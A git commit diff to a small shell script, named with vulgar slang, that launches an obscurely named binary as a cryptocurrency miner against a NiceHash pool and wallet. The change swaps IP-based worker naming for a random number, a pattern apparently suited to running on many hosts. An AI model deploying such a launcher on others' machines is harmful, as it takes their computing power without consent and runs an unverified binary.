482274965286a4024ce536c0df1c4c8429c4e66f
renilo <88342640+renilo@users.noreply.github.com>
2021-09-24 16:47:01 +0700

    Update kontol.sh

--- kontol.sh
+++ kontol.sh
@@ -1,10 +1,5 @@
 POOL=stratum+tcp://autolykos.eu-west.nicehash.com:3390
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
-myip=$(/usr/bin/curl -s http://whatismyip.akamai.com)
-r1=${myip/./_}
-r2=${r1/./_}
-r3=${r2/./_}
-r4=${r3/./_}
-WORKER=$(echo $r4-P100)
+WORKER=$(echo $(shuf -i 1-100000 -n 1)-P100)
 chmod +x memek
 ./memek --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$WORKER
